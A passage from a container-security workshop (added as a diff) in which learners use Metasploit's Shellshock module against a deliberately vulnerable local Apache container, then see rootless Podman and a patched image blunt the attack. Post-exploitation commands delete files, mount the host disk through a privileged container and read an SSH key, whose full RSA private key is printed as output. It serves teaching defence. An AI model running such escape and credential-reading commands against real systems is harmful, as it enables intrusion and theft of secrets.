@@ -1,0 +1,700 @@
+include::_attributes.adoc[]
+:source-highlighter: highlightjs
+
+= Metasploit
+:description: Introduction to Containers, Container Security and Container Tools including Podman and Buildah
+:keywords: docker, podman, buildah, skopeo, security, secure containers, containers, Red Hat, RHEL, Linux, Containerization, cloud, build a container, workshop, cloud native, openshift
+
+_25 MINUTE EXERCISE_
+
+In Module II you saw a video of how the Metasploit tool can be used to gain access into a container and a host that has vulnerabilities. in this extension exercise you can try it out for yourself.
+[NOTE]
+====
+Before running this exercise you will have needed to complete Module II.
+====
+
+[#exploit_containers]
+== Exploiting a Vulnerable Container
+
+In order to get a sense of how consequential these security exploits can be, let's exploit some of the issues in the containers we already have running
+
+image:Shellshock-logo.png[role=right,width=50]
+Our `{apache-server-image-insecure}` has a huge vulnerability in it that is further excerbated by the manner in which we've run our container.  The vulnerability is the (in)famous link:https://en.wikipedia.org/wiki/Shellshock_(software_bug)[Shellshock vulnerability^] 
+
+. First ensure the `{apache-server-image-insecure}` is running by running the following command in the terminal
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+podman ps
+----
++
+{zwsp}
++
+. You should see output something like below.  If you don't, then run the container as per link:container-persistence.html?USER={USER}&CLUSTER_SUBDOMAIN={CLUSTER_SUBDOMAIN}#podman_run_httpd[here^]
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::partial$podman_ps.adoc[]
+----
+{zwsp}
+
+[#using_metasploit]
+=== Using Metasploit
+
+We're going to use a tool called link:https://www.metasploit.com/[metasploit] (which has already been installed on your VM instance) to exploit the vulnerability (with alarming ease).  
+
+// This is common to the metasploit_setup_standalone page
+include::partial$metasploit_setup.adoc[]
+
+To ensure everything's setup right, we can check whether our setup is currently targeting a vulnerable container
+
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+check
+----
+
+Which should report the following output if successful: 
+
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+[+] 127.0.0.1:8081 - The target is vulnerable.
+----
+
+.TIP
+****
+If you get a message that the target is not vulnerable (and you are expecting it to be, make sure the `{apache-server-image-insecure}` is running
+****
+--
+====
+{zwsp}
+
+[#exploit_shellshock]
+=== Exploiting Shellshock
+
+Now it's time to exploit our running container.  This is as simple as running the following inside the metasploit console (it causes the `multi/http/apache_mod_bash_env_exec` module to be run with the configuration we set up in the previous section)
+
+include::partial$metasploit_exploit_shell.adoc[]
+
+[#wreaking_havoc]
+=== Wreaking havoc from within the container
+
+Now that we're in the container, let's show the kind of vulnerabilities we've exposed.  
+
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+. First, notice the user we're running as: 
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+whoami
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+root
+----
++
+. So we're running as the `root` user inside the container.  This is because we ran our container as root and setup our apache server to run as whichever user started the `httpd` process (in this case, `root`).
+. Now let's take a look at where we are in the container by issuing these two commands and reviewing the output (yours might vary slightly):
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+pwd && ls -l
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+/var/www/cgi-bin
+total 4
+-rwxr-xr-x. 1 root root 452 May 28 03:24 log-visitor.sh
+----
++
+. This is the script that logs visitors in our guestbook.  And notice that as root we have access to this script.  Feel free to look at the script 
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cat log-visitor.sh
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::example$log-visitor.sh[]
+----
++
+. Notice that the logbook directory is specified in the shell script.  We'll go there next.  But in the meantime we can damage the container by deleting the script
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+rm -f log-visitor.sh
+----
+--
+====
+
+Now if you try navigate to the guestbook at the following URL in the *Preview Browser* 
+
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+http://localhost:8081/hello.html
+----
+
+.The guestbook might now work so well anymore...
+image::apache-guestbook-page.jpg[]
+
+and enter a name into the Name: field and press the `Log to Guestbook` button you will get an error
+
+image::broken-guestbook.png[]
+
+[NOTE]
+.Ability to impact or sabotage running container
+====
+So far we've just impacted the running container.  To fix it we could just startup a new one.  But the vulnerabilities don't end there
+====
+
+[#wreaking_havoc_host]
+=== Wreaking havoc on the Host
+
+One key consideration when running containers as a given user is that this generally maps directly to a user on the host operating system.  As we'll see, this is particularly dangerous for a user such as `root` which exists on every system and has elevated privileges.  One of the places of "interaction" between the container and the host operating system where we can exploit this is via the *volume mounts* we were using
+
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+. From within the same metasploit shell, let's poke around the directory where visitors were getting logged
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cd /var/log/www && ls -l
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+total 8
+-rw-r--r--. 1 1001 1001 73 May 28 08:50 README.md
+drwxr-xr-x. 2 1001 1001 22 May 28 08:50 cgi-bin
+drwxr-xr-x. 2 1001 1001 29 May 28 08:50 oval
+drwxr-xr-x. 2 1001 1001 34 May 28 08:50 sql
+-rw-r--r--. 1 root root  5 May 30 07:31 visitor_info.txt
+----
++ 
+. This is particularly concerning as you'll notice that this mirrors the files you see in the `container-workshop` directory of your host (as you can verify from the **Explorer**)
+.  What's worse is that you are `root` so you can mess with stuff now in this directory (and below) of *the host system*.  For instance, enter the following commands:
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+echo "You've been hax0red" >> visitor_info.txt && chmod a+w visitor_info.txt
+----
+--
+====
+
+. If it's not open already, open the visitor_info.txt from the **Explorer**.  It will now look something like this: 
++
+image::hax0red.png[]
++
+[NOTE]
+.Access to host filesystem via volume mounts
+====
+This demonstrates that a malicious intruder could actually read and change files on the host system, provided access was afforded them through our volume mounts.  But it gets even worse in this case because of our use of the `privileged` flag.  This gives the container OS level capabilities, which we'll exploit to potentially devastating effect next
+====
++
+. Enter the following command to look at the disks(!) on the host operating system
++
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+
+[.console-input]
+[source,bash]
+----
+fdisk -l
+----
+
+The output you should see from the command is from the *host operating system*
+
+[.console-output]
+[source,bash,subs="+macros,+attributes"] 
+----
+pass:[WARNING:] fdisk GPT support is currently new, and therefore in an experimental phase. Use at your own discretion.
+
+pass:[Disk /dev/xvda: 21.5 GB, 21474836480 bytes, 41943040 sectors]
+Units = sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disk label type: gpt
+Disk identifier: 2E431796-24CD-41A3-A4CB-7987FFF67072
+
+
+pass:[#         Start          End    Size  Type            Name]
+ 1         2048         4095      1M  BIOS boot       
+ 2         4096     41943006     20G  Linux filesyste 
+----
+
+And now we can mount the root of the host filesystem by creating a directory and simply mounting the device at that directory
+
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+mkdir /mnt/hack
+mount /dev/xvda2 /mnt/hack
+touch /mnt/hack/hax0red.txt
+
+----
+
+From within the container, validate that you're at the top of the host filesystem by issuing a `tree` command, you should see the whole of the VMs contents scroll by
+
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cd /mnt/hack && tree
+----
+
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+.
+|-- bin -> usr/bin
+|-- boot
+|   |-- System.map-4.18.0-305.el8.x86_64
+|   |-- config-4.18.0-305.el8.x86_64
+|   |-- efi
+|   |   `-- EFI
+|   |       `-- redhat
+|   |-- grub2
+|   |   |-- device.map
+|   |   |-- fonts
+|   |   |   `-- unicode.pf2
+|   |   |-- grub.cfg
+|   |   |-- grubenv
+|   |   `-- i386-pc
+|   |       |-- acpi.mod
+|   |       |-- adler32.mod
+|   |       |-- affs.mod
+|   |       |-- afs.mod
+|   |       |-- ahci.mod
+|   |       |-- all_video.mod
+|   |       |-- aout.mod
+|   |       |-- appended_signature_test.mod
+...
+    |-- spool
+    |   |-- anacron
+    |   |   |-- cron.daily
+    |   |   |-- cron.monthly
+    |   |   `-- cron.weekly
+    |   |-- cron
+    |   |-- lpd
+    |   |-- mail
+    |   |   |-- ec2-user
+    |   |   `-- student1
+    |   `-- rhsm
+    |       `-- debug
+    |-- tmp
+    |   |-- cloud-init
+    |   |-- systemd-private-7dde33fba5c24ce9b2cf87368937522d-chronyd.service-iti2eg
+    |   |   `-- tmp
+    |   `-- systemd-private-7dde33fba5c24ce9b2cf87368937522d-nginx.service-NWeHPh
+    |       `-- tmp
+    `-- yp
+----
+--
+====
++
+[tabs]
+====
+Terminal 1::
++
+--
+. And from the left (VM) terminal, run the following command to show that a new file has been created on the host from within the container
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+ls -l /
+----
++
+[.console-output]
+[source,bash,subs="+macros,+quotes,+attributes"]
+----
+include::example$hacked_root.txt[]
+----
+--
+====
+
+
+. And finally, this means that any secrets on the host are exposed or manipulatable by the intruder.  For example, run the following from the *metasploit* terminal:
++
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+.Let's take a look at some sensitive ssh info
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+echo $(cat /mnt/hack/home/{USER}/.ssh/aws-private.pem)
+----
+
+Yields all the information about the private key!
+
+[.console-output]
+[source,bash]
+----
+-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAliPWwD0hWIoyF5XlnTkmuIUgYm/UkXhfdGYZseu8EcdvR7R0 qgucbVX4YVRZEAGkmIz09iqi1tbGnTO/OL1pnp39i8N5h8qwdIy9yODnHxVU7/9Q 1H+EBfFi9WJuipT6KtcGLOktUP12HVkeWSWCr20/p/MoUYAX0rid58JCB9/OjiHl sIUQe/0R6SFr0dVbuYT0rmmjectwwXJxJPw7wpUkdvCDT1W5Omyq33GnzYSSIZvy u2WNUDU9EWXWxcA9vCNmMrR0KXeKKjTKA5hTpR3koRYtkm44MVR8AtBi8ugfcjF8 mOQaKjOrxcF+Ac3xpLv2iVBPUesVF3g9qk9dLQIDAQABAoIBAG7jwXTysXJHf3/U AmcBEwwtpyGNHx7iHP5HeqriRWGMPzBio9gEA2DtoimgtrcPv5W8ZiB6lRLARqlM 0usBWsUAQ4e6tEQK/BDY8kMveQSIKNepZvXLyKLrCf/a13IbXjnN3o3FGuc6jMZY UAXfoooW0nElMp4fUXkdSeMmosZU7p6f39OenYExtkoyTirFMssoxie0dQvMClFF UKCLbdRQb9Va6JyquCQ/M5M3QfJqnCsLAyF8pyGnUwo8kxaRVfWOKxPI+LUdHYQm b1Yg3C1t97i69VEunNcd8mBUYhLo9XJSpfTnf2v/AMqMkMoWrfR92iZBUe40v8ME Z4dGKAECgYEA3yN2h8UobEEY+19hPviWPdmZfQk7VpKVqseoSxKJ2lr5In4utufu 0uGcTDorizJ92aQN10V4hSvpxokr1kK9qubddOfNq7OjAmDKDdzkX6n6T4aYZHwj CylmkqSoVTN0Bw3mfk76ZZIAyWhiTDH5/M+27JNqqf2UuJnuCHigSa0CgYEArEBC 02BLmwdMIeYh8/TWHWLfjMxIfJX30ctrUhuFqVrs55pOLKmkhVWUpjjmzRLz246h ulWJz271vPiQKRIqYpAIBIiXC9QsT5d4Nq33/1RMEUq2EaC2hzpZSbJnQMHJIzoh Rgy+zQKpExko+iNk5BTeCSf0B8niD3GxKY900YECgYAwgR706HCfB4+MpPEYpSTT kQeCXI1fhkGue/QjTYZVxsy9KLyy2bvab1xwXXy1p2Yf9z9i+iD2odMRayPyUVO1 YLXnAbR9jHD0xWFmnguul95nhxR9U1ayyG8ZlV1aF/MyzVy7PCPGDHTLUzt64Ko8 wFI9HtZi2VKIxj0t7jq5iQKBgQCsK2cgJGYtxPOCBqb1U0oZAVT1RNNHRBb6qdrR rRTCnFGjhYaR+daqN0pngwSfAkygrkZVG16t6fjSM5jUlIWtEs4Qyf5AIolP3NSZ wvXZTobh2c12fS80p0vL7/hor8m93kKX4/FqtTgOEN32eB5GI91zRW4TwuSkDz3H js5zAQKBgFLrkdCJ9bEf/ex3bm5mKfBf53rfkAQlJx7/qEP4oEzq5Wl6py66or/x SahGKZZJkY4fnr9PKa2aRL4TVpeh0llBhmCY8RrTdkOnD3xa9yQ9OHrvrnnX4Z18 FB1vN+pecKNOU0GI1xcg1NxkbEsiA//XasmGICpvJkwMdYne+ciL -----END RSA PRIVATE KEY-----
+----
+--
+====
+
+[#run_containers_responsibly]
+== Run containers responsibly
+
+Following the link:https://en.wikipedia.org/wiki/Principle_of_least_privilege[principle of least privilege^], there is a lot we could have done to limit the damage of any attacker such as:
+
+* don't run privileged containers
+* use SELinux to fine tune container access to volume mounts
+* don't run containers as root
+* ensure that your containers do not include known vulnerabilities or CVEs
+
+For the purposes of this lab, we're only going to investigate the last two items on this list.  
+
+[#non_root_containers]
+=== Non-root containers
+
+Most containerization runtimes, such as Docker, effectively require all containers to run as root by way of the Docker daemon on the system. 
+
+Podman is different in that regard.  Because it does not rely on a root-level service to be active to be able to run a container, containers can instead be run as normal users on the system.  How it does this is a bit beyond the scope of this workshop, but in short it does this through linux user namespace mapping.  
+
+When running as a non-root user on the host system, any container that is setup to run as root (like our apache webserver container) will present instead as the user who started the container to the host system.  This can further limit exposure of the host system.  Let's try this out.
+
+. First, before we do anything else, be sure to shutdown the currently running container
++
+[tabs]
+====
+Terminal 1::
++
+--
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+podman rm -f {apache-server-container-name}
+----
+--
+====
++
+. Once you enter that command to kill (and remove) the container, you'll notice the following in your metasploit terminal
++
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+[*] 127.0.0.1 - Meterpreter session 1 closed.  Reason: Died
+----
+--
+====
++
+. For most of the lab we have been running as the `root` user.  We're now going to run some commands to make sure we fall back to running as a normal unprivileged user
++
+[tabs]
+====
+Terminal 1::
++
+--
+. First confirm that you are currently the `root` user
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+whoami
+----
++
+. ensure the you see the following (if not you may have already logged out)
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+root
+----
++
+. then run the following command to exit `sudo` session
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+exit
+----
++
+. Check to ensure you are no longer the root user in the terminal by running the following command
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+whoami
+----
++
+. Ensure that the output of the command is the following:
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+{USER}
+----
++
+.TIP
+****
+If the user displayed as the output of `whoami` does not match the `{USER}` ensure you followed the instructions <<non_root_containers,here>> correctly or ask for assistance.
+****
+--
+====
++
+. Now we'll run our webserver much like we did before but _this time as a non-root user_
++
+[tabs]
+====
+Terminal 1::
++
+--
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+podman run \
+    --privileged \#<.>
+    -d \
+    -p 8081:80/tcp \ 
+    --name {apache-server-container-name} \
+    -v {container-workshop-exercise-path}:/var/log/www:Z \
+    {apache-server-image-insecure}
+----
+<.> Despite what we learned in the previous sections about the risks inherent in running with `--privileged` we are going to use that flag again when running the container rootlessly.  You'll see soon why this is OK
+--
+====
+
+[NOTE]
+====
+You will notice that the container needs to be downloaded again.  Didn't we do this already?  We did, but as `root`.  Each user keeps their own local container storage separate from all other users.
+====
+
+include::partial$metasploit_shell_return.adoc[]
+
+include::partial$metasploit_exploit_shell.adoc[]
+
+Now with your shell setup from metasploit, run the following command:
+
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+touch /var/log/www/hello_from_rootless_podman.txt
+----
+--
+====
+
+[NOTE]
+====
+When you create the file, you should see a file appear in the `container_workshop` in the explorer
+====
+
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+. Run the following command to look at the permissions of the file
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+ls -l /var/log/www/hello_from_rootless_podman.txt
+----
++
+. It should appear that the files are created by root
++
+[.console-output]
+[source,bash,subs="+macros,+attributes,+quotes"]
+----
+-rw-r--r--. 1 #root# #root# 0 Jun 14 13:25 /var/log/www/hello_from_rootless_podman.txt
+----
++
+. This makes sense as you are still running in the container as root.  Prove this by running:
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+whoami
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+root
+----
+--
+====
+
+The noteworthy part is what we see on the *host* filesystem.  From the main shell (which is running directly on the host and not in a container), let's take a look at the file we created (that recently appeared in the explorer)
+
+[tabs]
+====
+Terminal 1::
++
+--
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+ls -l {container-workshop-exercise-path}/hello_from_rootless_podman.txt
+----
+
+[.console-output]
+[source,bash,subs="+macros,+attributes,+quotes"]
+----
+-rw-r--r--. 1 #student1# #student1# 0 Jun 14 13:25 /home/student1/container-workshop/hello_from_rootless_podman.txt
+----
+--
+====
+
+The key here is that unlike before, the files on the host were created as `{USER}`, that is, the user that ran the `podman` command and not `root` as it appeared from inside the container
+
+Podman is able to accomplish this through "namespacing" and mapping container UIDs to different UIDs on the host.  Any container running as `root` when running as rootless podman will always present to the host (such as via volume mounts) as the user that ran the rootless podman command in the first place.
+
+This affords an additional layer of (preventative) security as even containers that think they are running as root are not actually running with such privileges on the host
+
+Finally, remember how we ran this container with the `--privileged` flag even though we know that it confers extra powers to the container?  Let's try our `fdisk` trick again
+
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+fdisk -l
+----
+
+But this time it will appear as if we had not run with the `--privileged` flag at all:
+
+--
+====
+
+This is again due to the fact that the container is not actually running as root on the host system, it is running as `{USER}` and `{USER}` does not have permissions to run `fdisk` normally.  Hence rootless containers afford additional layers of security on top of the ones we indicated already
+
+[#test_secure_container]
+== Testing our Secure Container
+
+In Module II you built a new image and we will now test this with Metasploit.
+
+:stop-container-name: {apache-server-container-name}
+include::partial$ensure_no_running_container.adoc[]
+
+. Run the new container "rootlessly" in the terminal by running the following command: 
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+podman run \
+    -d \
+    -p 8081:80/tcp \#<.>
+    --name {apache-server-container-name} \
+    -v {container-workshop-exercise-path}:/var/log/www:Z \
+    {apache-server-image-secure-image}
+----
+<.> Since our new container image is virtually identical to the original one (except for the new bash package) and we're forwarding the same ports we can now attempt to exploit the container again with the configuration from before
+
+include::partial$metasploit_shell_return.adoc[]
+ 
+Next run the following command in the *metasploit* terminal (*{metasploit-terminal}*)
+
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+check
+----
+
+And this should result in the following output:
+
+[.console-output]
+[source,bash,subs="+macros,+attributes,+quotes"]
+----
+[*] 127.0.0.1:8081 - The target is #not# exploitable.
+----
+--
+====
+
+Congratulations!  You'd fixed the shellshock exploit of the original `{apache-server-image-insecure-image}` container!
+
+.TIP
+****
+You are now done with metasploit and {metasploit-terminal}.  You can close down that terminal with the following commands:
+
+[tabs]
+====
+{metasploit-terminal}::
++
+--
+
+First exit out of metasploit
+
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+exit
+----
+
+Which should return you to the lab instance terminal
+
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+[{USER}@ansible-1 ~]$
+----
+
+And now exit out of that terminal
+
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+exit
+----
+
+Which should return you terminal to a single "unsplit" terminal window
+
+image::terminal-unsplit.jpg[]
+
+--
+====
